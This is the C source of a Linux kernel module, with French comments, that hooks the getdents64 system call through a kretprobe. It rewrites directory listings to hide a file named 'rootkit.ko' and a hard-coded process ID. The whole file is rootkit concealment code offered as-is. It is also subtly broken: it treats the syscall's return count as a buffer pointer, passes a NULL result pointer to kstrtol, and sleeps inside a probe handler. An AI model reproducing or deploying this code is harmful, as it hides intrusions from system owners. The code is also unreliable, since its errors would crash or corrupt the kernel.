#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/ptrace.h>
#include <linux/sched.h>
#include <linux/fs.h>
#include <linux/fdtable.h>
#include <linux/dcache.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("tibo.wav");
MODULE_DESCRIPTION("Hook __x64_sys_getdents64 using kretprobes and filter directory entries");

struct linux_dirent64 {
    __u64           d_ino;       /* Numéro d'inode */
    __s64           d_off;       /* Décalage vers l'entrée suivante */
    unsigned short  d_reclen;    /* Longueur de cette entrée */
    unsigned char   d_type;      /* Type de fichier (DT_UNKNOWN, DT_DIR, DT_REG, etc.) */
    char            d_name[];    /* Nom du fichier (terminé par \0) */
};

static pid_t pid_to_hide = 1234; // PID à cacher
static char *files_to_hide[] = {"rootkit.ko", NULL}; // Fichiers à masquer

// Fonction pour vérifier si un nom de fichier doit être masqué
static int should_hide_file(const char *name)
{
    int i = 0;
    while (files_to_hide[i] != NULL) {
        if (strstr(name, files_to_hide[i]) != NULL) {
            return 1; // Masquer ce fichier
        }
        i++;
    }
    return 0;
}

// Fonction principale pour modifier le contenu de la liste des fichiers
static int ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct linux_dirent64 __user *user_output = (struct linux_dirent64 __user *)regs_return_value(regs);
    struct linux_dirent64 *dirent, *next_dirent;
    char *kbuf;
    unsigned long offset = 0;
    int ret;

    // Si aucune donnée n'est retournée, sortir
    if (!user_output) {
        return 0;
    }

    // Allouer un buffer kernel pour copier les données utilisateur
    kbuf = kmalloc(PAGE_SIZE, GFP_KERNEL);
    if (!kbuf) {
        pr_err("[-] Failed to allocate memory\n");
        return -ENOMEM;
    }

    // Copier les données utilisateur vers le buffer kernel
    ret = copy_from_user(kbuf, user_output, PAGE_SIZE);
    if (ret) {
        pr_err("[-] Failed to copy data from user space\n");
        kfree(kbuf);
        return -EFAULT;
    }

    dirent = (struct linux_dirent64 *)kbuf;
    while (offset < PAGE_SIZE) {
        next_dirent = (struct linux_dirent64 *)((char *)dirent + dirent->d_reclen);

        // Vérifier si l'entrée doit être masquée
        if (should_hide_file(dirent->d_name) ||
            (kstrtol(dirent->d_name, 10, NULL) == pid_to_hide)) {
            size_t reclen = dirent->d_reclen;
            memmove(dirent, next_dirent, PAGE_SIZE - offset - reclen);
        } else {
            offset += dirent->d_reclen;
            if (dirent->d_off == 0) {
                break; // Fin de la liste
            }
        }
        dirent = next_dirent;
    }

    // Copier les données modifiées vers l'espace utilisateur
    ret = copy_to_user(user_output, kbuf, PAGE_SIZE);
    if (ret) {
        pr_err("[-] Failed to copy data to user space\n");
        kfree(kbuf);
        return -EFAULT;
    }

    kfree(kbuf);
    return 0;
}

// Kretprobe configuration
static struct kretprobe krp = {
    .handler = ret_handler,
    .entry_handler = NULL,
    .data_size = 0,
    .maxactive = 20,
};

// Module initialization
static int __init hook_init(void)
{
    krp.kp.symbol_name = "__x64_sys_getdents64";
    if (register_kretprobe(&krp)) {
        pr_err("[-] Failed to register kretprobe\n");
        return -1;
    }
    pr_info("[+] __x64_sys_getdents64 hooked successfully\n");
    return 0;
}

// Module cleanup
static void __exit hook_exit(void)
{
    unregister_kretprobe(&krp);
    pr_info("[+] __x64_sys_getdents64 unhooked successfully\n");
}

module_init(hook_init);
module_exit(hook_exit);
